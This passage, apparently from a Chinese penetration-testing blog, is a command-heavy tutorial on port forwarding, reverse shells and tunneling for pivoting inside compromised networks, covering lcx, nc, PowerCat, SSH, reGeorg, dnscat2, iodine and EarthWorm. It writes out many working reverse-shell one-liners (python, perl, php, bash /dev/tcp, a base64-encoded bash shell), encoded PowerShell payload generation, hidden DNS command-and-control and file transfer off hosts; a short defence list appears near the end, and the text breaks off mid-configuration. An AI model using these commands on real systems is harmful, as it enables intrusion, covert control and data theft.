title="lcx-端口转发"></a><strong>lcx-端口转发</strong></h2><p>基于socket套接字实现的端口转发工具。实现的是一对一的端口转发，若想要转发内网中多台服务器需要一次次重复转发过程，效率低。对于以下3种情况，lcx只可以突破1和2二种，因为lcx在使用中需要访问外部网络。</p><ul><li>服务器处于内网，可以访问外部网络。</li><li>服务器处于外网，可以访问外部网络，但是服务器安装了防火墙来拒绝敏感端口的连接。</li><li>服务器处于内网，对外只开放了80端口，并且服务器不能访问外部网络。</li></ul><p><strong>win版本</strong></p><p>将目标的3389端口的所有数据都转发到公网VPS的2222端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave 外网IP 2222 127.0.0.1 3389 端口转发</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209211833.png"></p><p>将本机2222端口监听到的所有数据转发到本机的3333端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 3333</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209211856.png"></p><p>将目标主机338端口映射到防火墙允许的其他端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -tran 6666 目标主机IP 3389 本地端口映射</span><br></pre></td></tr></table></figure><p><strong>linux版</strong></p><p>自测xshell访问远程终端不知道怎么回事会失败，putty可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 2222 -p2 3333 ./portmap -m 3 -h1 外网IP -p1 2222 -h2 127.0.0.1 -p2 22</span><br></pre></td></tr></table></figure><h2 id="nc-反弹shell-端口转发"><a href="#nc-反弹shell-端口转发" class="headerlink" title="nc-反弹shell-端口转发"></a><strong>nc-反弹shell-端口转发</strong></h2><p>网络调试和探测工具，使用TCP或UDP协议的网络连接去读写数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -v -n -z 172.16.1.12 1-10000      端口扫描</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209213750.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv -z 172.16.1.12 21      Banner抓取</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209213803.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e C:\\Windows\\system32\\cmd.exe    反弹shell：正向连接 </span><br><span class="line">nc -lvvp 6666 -e /bin/sh </span><br><span class="line">nc 172.16.1.7 6666</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220120.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666     反弹shell：反向连接 </span><br><span class="line">nc 172.16.1.1 6666 -e C:\\Windows\\system32\\cmd.exe </span><br><span class="line">nc 172.16.1.1 6666 -e /bin/sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220220.png"></p><p>下载文件类似，可以用-d后台传输。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 &gt; test.txt               文件传输：上传或下载 </span><br><span class="line">nc 172.16.1.7 6666 &lt; E:\123.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220258.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 简易聊天 </span><br><span class="line">nc 172.16.1.1 6666</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220346.png"></p><p>思路：攻击端无法直接访问目标核心数据库系统，已拿下一台Web服务器，且该服务器可访问数据库服务器，可将Web服务器作为代理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666                                             VPS 端口转发充当代理 </span><br><span class="line">nc -lvvp 5555 -e /bin/sh                                  数据库服务器 </span><br><span class="line">nc -v 172.16.1.1 6666 -c &quot;nc -vv 172.16.1.7 5555&quot;       Web</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209220459.png"></p><p>使用编程语言等代替nc反弹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;172.16.1.9&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27; </span><br><span class="line">perl -e &#x27;use Socket;$i=&quot;1.2.3.4&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27; </span><br><span class="line">php -r &#x27;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27; </span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/172.16.1.1/6666 0&gt;&amp;1 </span><br><span class="line">bash -i &amp;gt;&amp;amp; /dev/tcp/65.49.222.180/6666 0&amp;gt;&amp;amp;1 </span><br><span class="line">bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjE5MS4xMDQuMjM2LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><h2 id="PowerCat-反弹shell-端口转发"><a href="#PowerCat-反弹shell-端口转发" class="headerlink" title="PowerCat-反弹shell-端口转发"></a><strong>PowerCat-反弹shell-端口转发</strong></h2><p>Powershell版nc，命令大同小异。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted </span><br><span class="line">import-module .\powercat.ps1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666              与nc互连 </span><br><span class="line">powercat -c 172.16.1.7 -p 6666 -e C:\Windows\System32\cmd.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221117.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -v -p 6666                   返回Powershell </span><br><span class="line">powercat -c 172.16.1.1 -p 6666 -v -ep</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221149.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -of test.txt -v                    传输文件 </span><br><span class="line">powercat -c 172.16.1.10 -p 6666 -i C:\123.txt -v or &quot;testtest&quot; | powercat -c 172.16.1.10 -p 6666 -v</span><br></pre></td></tr></table></figure><p>传输完毕不会自动断开，可在命令行中继续追加写入的字符，按ctrl+c断开。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221257.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221307.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -ep -v -g &gt;&gt; shell.ps1          生成Payload：正向 </span><br><span class="line">powercat -c IP -p 6666 -ep -v -g &gt;&gt; shell.ps1              反向</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221418.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat -c 172.16.1.10 -p 6666 -ep -v -ge           -ge：生成经过编码的Payload（PS4.0及以上） </span><br><span class="line">powershell -E XXXXXXXXXXX </span><br><span class="line">powercat -l -p 6666 -v</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221527.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powercat -l -p 6666 -v -ep                             win2012  端口转发充当代理 </span><br><span class="line">powercat -l -p 9999 -v -r tcp:172.16.1.6:6666          win7-跳板机 </span><br><span class="line">powercat -c 172.16.1.10 -p 9999 -v                     win10</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221614.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/iagox86/dnscat2.git     服务端用dnscat，powercat支持DNS协议 </span><br><span class="line">cd dnscat2/server/ </span><br><span class="line">gem install bundler bundler install ruby dnscat2.rb ttpowercat.test -e open --no-cache    服务端启用dnscat powercat -c 172.16.1.7 -p 53 -dns ttpowercat.test -e C:\Windows\System32\cmd.exe </span><br><span class="line">session -i 1    服务端执行 </span><br><span class="line">powercat -l -p 9999 -v -r dns:172.16.1.6:ttpowercat.test （充当跳板机命令）</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209221851.png"></p><h1 id="应用层隧道"><a href="#应用层隧道" class="headerlink" title="应用层隧道"></a><strong>应用层隧道</strong></h1><h2 id="ssh协议-端口转发-代理"><a href="#ssh协议-端口转发-代理" class="headerlink" title="ssh协议 - 端口转发-代理"></a><strong>ssh协议 - 端口转发-代理</strong></h2><p>模拟环境：远程攻击端只可以访问web服务器172.16.1.5（双IP），以web服务器为跳板，将目标172.16.1.10的3389端口映射到远程攻击端的1153端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 1153:172.16.1.10:3389 root@172.16.1.5     攻击端执行，本地转发</span><br><span class="line">接下来需要输入跳板机172.16.1.5的密码 </span><br><span class="line">netstat -tulnp | grep &quot;1153&quot;         查看端口开启成功没 </span><br><span class="line">rdesktop 127.0.0.1:1153</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222309.png"></p><p>模拟环境：远程攻击端不可以访问内网所有目标，而内网中只有Web服务器172.16.1.5（单IP）可以访问远程攻击端，以172.16.1.5为跳板，将远程攻击端的3307端口的流量转发到目标172.16.1.10的3389端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -R 3307:172.16.1.10:3389 root@172.16.1.7       web服务器执行，远程转发</span><br><span class="line">接下来需要输入攻击端172.16.1.7的密码 </span><br><span class="line">netstat -tulnp | grep &quot;3307&quot;             查看端口开启成功没 </span><br><span class="line">rdesktop 127.0.0.1:3307</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222434.png"></p><p>模拟环境：远程攻击端只可以访问web服务器172.16.1.5（双IP），以web服务器为跳板。动态端口映射就是建立一个SSH加密的SOCKS4&#x2F;5代理，任何支持这个协议的程序都可以使用这个加密通道。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -D 7000 root@172.16.1.5      攻击端执行    动态转发 </span><br><span class="line">接下来需要输入攻击端172.16.1.5的密码 </span><br><span class="line">netstat -tulnp | grep &quot;7000&quot;        查看端口开启成功没 </span><br><span class="line">随后在攻击端本地设置代理127.0.0.1:7000</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222535.png"></p><h2 id="HTTP-x2F-HTTPS协议：reGeorg-代理"><a href="#HTTP-x2F-HTTPS协议：reGeorg-代理" class="headerlink" title="HTTP&#x2F;HTTPS协议：reGeorg-代理"></a><strong>HTTP&#x2F;HTTPS协议：reGeorg-代理</strong></h2><p>把内网服务器的端口通过http或https隧道转发到本机，形成TCP连通回路。reDuh和lcx不同的地方就是reDuh不需要本地电脑拥有外网IP。包括reGeorg、reduh等工具。</p><p>reGeorg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python reGeorgSocksProxy.py -u http://172.16.1.12:8085/tunnel.apsx -p 999 </span><br><span class="line">端口已经架设好，可以使用proxychains等代理工具，爆破3389</span><br></pre></td></tr></table></figure><p>reduh</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar reDuhClient.jar http://172.16.1.8:81/practice/reDuh.php      本地客户端连接服务端 </span><br><span class="line">nc -vv 127.0.0.1 1010                                 在本地用NC连接1010管理端口 </span><br><span class="line">[createTunnel]1234:目标IP:3389              在管理端口输入命令转发本地端口流量到远程目标端口</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222911.png"></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209222922.png"></p><h2 id="DNS协议：dnscat2-反弹shell"><a href="#DNS协议：dnscat2-反弹shell" class="headerlink" title="DNS协议：dnscat2-反弹shell"></a><strong>DNS协议：dnscat2-反弹shell</strong></h2><p>防火墙、IDS通常不会过滤DNS流量，DNS隧道通常被利用在APT攻击中。（C&amp;C通信）</p><p>包括dnscat2、iodine等工具。</p><p><strong>工作原理</strong></p><p>在进行DNS查询时，如果查询的域名不在DNS服务器本机的缓存中，就会访问互联网进行查询，然后返回结果（实际上可以返回IP地址或者任意字符串 -&gt; C&amp;C），简单的说就是将其他协议封装在DNS协议中传输，表面上看是没有接通外网的（内网网关没有转发IP数据包），实际上是内网的DNS服务器进行了中转操作。</p><p><strong>TIPS</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">A记录：通俗来说就是服务器的IP </span><br><span class="line">MX记录：邮件路由记录，指向一个邮件服务器 </span><br><span class="line">CNAME记录：将域名指向一个域名，实现与被指向域名相同的访问效果 </span><br><span class="line">TXT记录：可任意填写，可为空。一般做一些验证记录时会使用此项，如：做SPF（反垃圾邮件）记录 </span><br><span class="line">AAAA记录：将主机名（或域名）指向一个IPv6地址 </span><br><span class="line">NS记录：指定子域名由哪个DNS服务器解析 </span><br><span class="line">PTR记录：目标邮箱服务器会查询来源邮件的头文件，进行反向域名解析，看解析结果是否能和发件人对应 </span><br><span class="line">SPF记录：存放服务器授权IP，邮件接收方会根据SPF记录判断来源IP是否正确，得知邮件是否是伪造的</span><br></pre></td></tr></table></figure><p><strong>工作流程</strong></p><ul><li>假设域名为a.qqq.com的主机想知道另一个主机b.sss.com的IP地址。</li><li>主机查找本地计算机缓存，没找见。 </li><li>主机向本地域名服务器（本机TCP&#x2F;IP参数中设置的值）dns.qqq.com进行递归查询，没找见。 </li><li>本地域名服务器向一个根域名服务器进行迭代查询，返回下一次应查询的顶级域名服务器dns.com的IP地址。 </li><li>本地域名服务器向顶级域名服务器dns.com进行查询，返回下一步应查询的权限服务器dns.sss.com的IP地址。 </li><li>本地域名服务器向权限域名服务器dns.sss.com进行查询，返回所查询的主机的IP地址。 </li><li>本地域名服务器最后把查询结果告诉a.qqq.com。 </li><li>最后本地计算机、本地域名服务器更新缓存表，方便以后查询。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf|grep -v &#x27;#&#x27; 查询内部域名和域名服务器地址</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224246.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nslookup holy.testA      查看能否与内部DNS通信，解析内部域名 </span><br><span class="line">nslookup baidu.com       查看能否通过内部DNS解析外部域名</span><br></pre></td></tr></table></figure><p>能解析外部域名意味着可以使用DNS隧道实现隐蔽通信。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224254.png"></p><p><strong>dnscat2</strong></p><p>使用dns协议创建加密的C&amp;C通道，基于53端口，通过预共享密钥进行身份验证，更加隐蔽，有服务端和客户端，所有的指令都可以在该控制台内完成。包括：文件上传、下载、反弹Shell。</p><p>exe：<a href="https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip">https://downloads.skullsecurity.org/dnscat2/dnscat2-v0.07-client-win32.zip</a></p><p>ps：<a href="https://github.com/lukebaggett/dnscat2-powershell">https://github.com/lukebaggett/dnscat2-powershell</a></p><p><strong>Tips</strong></p><ul><li>DNS解析的类型：常见的有：A、CNAME、MX、TXT、AAAA（ 默认是TXT、CNAME、MX随机混合使用）。</li><li>直连模式：客户端直接向指定IP的恶意DNS服务器发起DNS解析请求，不通过DNS服务商。</li><li>中继模式：DNS解析先经过互联网的迭代解析，最后指向恶意DNS服务器。相比直连，速度较慢，但是更安全。</li></ul><p>（如果没有购买域名，还可以在UDP&#x2F;53上使用直连，会更快，但它在数据包中更明显（所有域名都以dnscat为前缀）。防火墙经常会阻止此模式）</p><p><strong>安装</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ruby环境 </span><br><span class="line">apt-get install gem </span><br><span class="line">apt-get install ruby-dev </span><br><span class="line">apt-get install libpq-dev </span><br><span class="line">apt-get install ruby-bundler </span><br><span class="line">服务端 </span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git </span><br><span class="line">cd dnscat2/server/ </span><br><span class="line">gem install bundler </span><br><span class="line">bundle install </span><br><span class="line">客户端 </span><br><span class="line">git clone https://github.com/iagox86/dnscat2.git </span><br><span class="line">cd dnscat2/client/ </span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><strong>连接</strong></p><p>服务端 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ruby ./dnscat2.rb --secret=123456 --no-cache          直连 </span><br><span class="line">ruby ./dnscat2.rb domain -e open -c 123456 --no-cache          中继 </span><br></pre></td></tr></table></figure><p>客户端 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./dnscat --ping domain             测试是否连通 </span><br><span class="line">./dnscat --dns server=172.16.1.6,port=53 --secret=123456              直连 </span><br><span class="line">dnscat2-v0.07-client-win32.exe --dns domain=xxxxx --secret 123456     中继</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224815.png"></p><p><strong>反弹shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">window or session           查看客户端在线情况 </span><br><span class="line">window -i 编号 or session -i 编号         选定客户端 </span><br><span class="line">shell      创建交互式shell，是另一个会话 </span><br><span class="line">ctrl+z      返回到选客户端界面 </span><br><span class="line">window -i         往下选一个编号打开shell</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209224938.png"></p><p><strong>powershell版本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">客户端执行（可远程加载） </span><br><span class="line">powershell -nop -w hidden -c &quot;&amp; &#123;Import-Module .\dnscat2.ps1; Start-Dnscat2 -Domain domain -DNSServer IP&#125;&quot; </span><br><span class="line">exec psh        创建新shell</span><br></pre></td></tr></table></figure><p><strong>iodine</strong></p><p>IPv4的数据通道，分直连和中继，连接时服务端和客户端都会建立虚拟网卡。服务端程序提供特定域名的DNS解析服务，当客户端请求该域名的解析，就可以建立通道连接，两者通过DNS隧道，同处于一个局域网（即两张虚拟网卡IP会在同一个局域网）。</p><p><strong>安装</strong></p><p>apt-get install（kali自带）。</p><p><strong>连接</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iodined -P 123456 -f -DD 192.168.0.1 abc.com          服务端 </span><br><span class="line">iodine -P 123456 -f -r &lt;your iodine server ip&gt; abc.com     客户端</span><br></pre></td></tr></table></figure><p><strong>防御dns隧道攻击方法</strong></p><ul><li>只允许由内向外与受信任的DNS服务器通信。 </li><li>注意流量中的TXT请求。 </li><li>跟踪用户的DNS查询次数 。</li><li>禁止ICMP。</li></ul><h2 id="SOCKS代理：EarthWorm-代理-端口转发"><a href="#SOCKS代理：EarthWorm-代理-端口转发" class="headerlink" title="SOCKS代理：EarthWorm-代理+端口转发"></a><strong>SOCKS代理：EarthWorm-代理+端口转发</strong></h2><p>一种代理服务，支持多种协议，包括HTTP、FTP等；避免多次端口转发，可以理解为增强版的lcx，可以应对之前提过的三种网络情况。包括EarthWorm、reGeorg、sSocks、SocksCap64、Proxifier、ProxyChains等工具。</p><ul><li>SOCKS 4：支持TCP。 </li><li>SOCKS 5：支持TCP&#x2F;UDP，还有各种身份验证机制，标准端口为1080。</li></ul><p><strong>EarthWorm</strong></p><p>在服务端监听一个服务端口，当有新的连接请求时会从SOCKS协议中解析出访问目标URL的目标端口，再开始执行lcx的具体功能。共有 6 种命令格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssocksd 正向代理，适用于目标拥有外网IP </span><br><span class="line">rcsocks 反向代理，适用于目标可访问外网 </span><br><span class="line">rssocks </span><br><span class="line">lcx_slave      端口转发、多级级联 </span><br><span class="line">lcx_listen </span><br><span class="line">lcx_tran</span><br></pre></td></tr></table></figure><p>正向代理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 888                 开启SOCKS5服务 </span><br><span class="line">使用代理软件设置全局代理：目标IP:888</span><br></pre></td></tr></table></figure><p>反向代理。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888       在外网IP上添加一个转接隧道，把1080端口收到的代理请求转交给反连8888端口的主机，其中rcsocks可以用lcx_listen代替 </span><br><span class="line">ew -s rssocks -d 外网IP -e 8888 在目标机器上启动SOCKS5服务，反弹到外网IP的8888端口上</span><br><span class="line">使用代理软件设置全局代理：外网IP:8888</span><br></pre></td></tr></table></figure><p>二级网络环境1：正向+端口映射。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X（1.1.1.1、10.10.10.10）：内网主机，两块网卡，一块可访问外网，有外网IP（防火墙分配，不同于整个内网的出口IP），另一块可访问Y，无法访问其他内网资源 </span><br><span class="line">Y（1.1.1.2）：目标，内部主机，可访问内网资源，无法访问外网</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocked -l 888         在Y中执行，开启SOCKS5正向代理 </span><br><span class="line">ew -s lcx_tran -l 1080 -f 1.1.1.2 -g 888 在X中执行将本机1080端口收到的请求映射给Y的888端口 </span><br><span class="line">使用代理软件设置全局代理：10.10.10.10:1080</span><br></pre></td></tr></table></figure><p>二级网络环境2：正向+反向+端口转发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X（1.1.1.1）：内网主机，无外网IP，可访问外网和Y，无法访问其他内网资源 </span><br><span class="line">Y（1.1.1.2）：目标，内部主机，可访问内网资源，无法访问外网 </span><br><span class="line">外网IP：2.2.2.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 8888     在外网主机上添加转接隧道，将1080端口收到的代理请求转交给反连8888端口的主机 </span><br><span class="line">ew -s ssocksd -l 9999 在Y中运行，开启SOCKS5正向代理 </span><br><span class="line">ew -s lcx_slave -d 2.2.2.2 -e 8888 -f 1.1.1.2 -g 9999 在X中运行，将Y主机的9999端口和外网主机的8888端口连接 </span><br><span class="line">使用代理软件设置全局代理：2.2.2.2:1080</span><br></pre></td></tr></table></figure><p>三级网络环境：正向+反向+端口转发。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">X（1.1.1.1）：内网主机，无外网ip，可访问外网和Y，无法访问其他内网资源 </span><br><span class="line">Y（1.1.1.2）：内网主机，可访问Z，无法访问外网 </span><br><span class="line">Z（1.1.1.3）：目标，内部主机，可访问内网资源，无法访问外网 </span><br><span class="line">外网IP：2.2.2.2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888       在外网主机上添加转接隧道，将1080端口收到的代理请求转交给反连8888端口的主机 </span><br><span class="line">ew -s lcx_slave -d 2.2.2.2 -e 8888 -f 1.1.1.2 -g 9999       在X中运行，将Y主机的9999端口转发到公网主机的8888端口上 </span><br><span class="line">ew -s lcx_listen -l 9999 -e 7777       在Y主机上添加转接隧道，将9999端口收到的代理请求转交给反连7777端口的主机 </span><br><span class="line">ew -s rssocks -d 1.1.1.2 -e 7777       在Z主机上开启SOCKS5代理并反向连接到Y主机的7777端口 </span><br><span class="line">使用代理软件设置全局代理：2.2.2.2:1080 </span><br><span class="line">数据流向为1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</span><br></pre></td></tr></table></figure><p><strong>SocksCap64：win全局代理</strong></p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210209230249.png"></p><p><strong>ProxyChains：linux全局代理</strong></p><ol><li><p>vi &#x2F;etc&#x2F;proxychains.conf，删除dynamic_chain前的注释符。</p></li><li><p>在ProxyList处添加代理配置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 